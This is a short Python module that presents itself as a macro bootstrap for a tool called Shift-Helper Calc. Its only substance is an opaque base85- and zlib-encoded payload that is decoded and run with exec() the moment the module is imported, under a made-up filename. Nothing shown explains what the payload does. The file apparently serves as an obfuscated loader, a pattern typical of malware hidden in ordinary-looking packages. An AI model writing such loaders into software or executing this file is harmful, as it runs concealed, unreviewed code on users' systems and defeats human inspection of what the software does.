"""Portable operator macro bootstrap for Shift-Helper Calc."""

from __future__ import annotations

import base64
import zlib

_PAYLOAD = (
    b"c-oaz&59g15We?Q6rF>+@wgB9v$HUPA>M<D<7~#{5P}iv?&@AK8mW=g-kqH6HGy1{Cov`ti-"
    b"|X{pn0Q|)IU38Odx$|Nu{qoRh2$fnx>C6ufd%oJVzrMfi>t34R_jr>6H^(gvRJ?gmk>x@RlGQ-^t)t>26n~X__Pv!&uY1-"
    b"XLQjww*Q(xKi42C$zFjGTE$~rX{!d<>%9C7^EnR-U&Hbe<8y_-"
    b"*I<Ni;4S;mPx|ar$7AoXnp#SeYaYFd%AuKOUM$SFSY0Tf>m6is<}xQ2gZ;V>qND|+0J{XStA^?D6w)_Govr;v|CB!>UPUgC2"
    b"-!{qG^$FRkKi!5k)D_M^d!Mw5;647$$^J7726VTDIjvIaFL#$Q)j}<G6LrcZ|^8aKaoy-__h9anrpqDYn8{7HY<%Zs!~f28`"
    b"~V)Or&RlB_nonU820UWUqI{j@TobAdfilBC84*m&g>xkH=faPMn~)05~M0;0kn-(b-"
    b"Q6>5c5M&XObv2&CpE=og7J29qtWDw0jA}l=73W4-"
    b"T(uuZ08_^0ioD@F8g+*8o@;o(0n=JKz!2X4Qy??p?&0o{(t$**Y{WbWT{S_Hs#s8Imvw!8^?yqJA`y2lc8G`2(L0{}&`gi32"
    b"EBL?tYyXZmZpd`w-"
    b"xOn<R`;et$~DL@I|wf?sJ?Z)vkX<GYoXd@+Pmi7gVEI)434D#qT|M5HgGKtlN^v!bjw(aXli0XY6PJoQBmr8cUuxFUnrNbBn"
    b"}tElLhc19=5Vpv?{*^hp*C9J=NnO16RB32y{T_IEma1girVub3#+&h}J?-s7pxM+3Kgq-"
    b">)8~M<gNg0T*HqVHLyD&ae++yG=iwCWWJhBpE*EGG<lKq{sZorKI9-l8;wnq+1Mv&Hr0RXa83iKsXwr<o@!1?tl01C#`$}-"
    b"{|m|orTreBdCq;Ivl!fBaC%$C%*%_fuQ#>OBxjxutrNS83S}=n%i?o0=SDT8>KJQT&`00q0{Z4#3ne`IH<6Q6b7j^&)}a=?t"
    b"k{xr_bOnlxd#QFxi9o<QctsHnsm{Y{5lf+ja)6&4#vJln=g$M_~40cgXW%+?gK$UQ!zf3_=oq<X*tX8bi}dS#-"
    b"OUc7s=%FQApW<T5ZP{{r`MV<!"
)

exec(
    compile(
        zlib.decompress(base64.b85decode(_PAYLOAD)).decode("utf-8"),
        "shift_helper_tools_bootstrap.py",
        "exec",
    ),
    globals(),
)
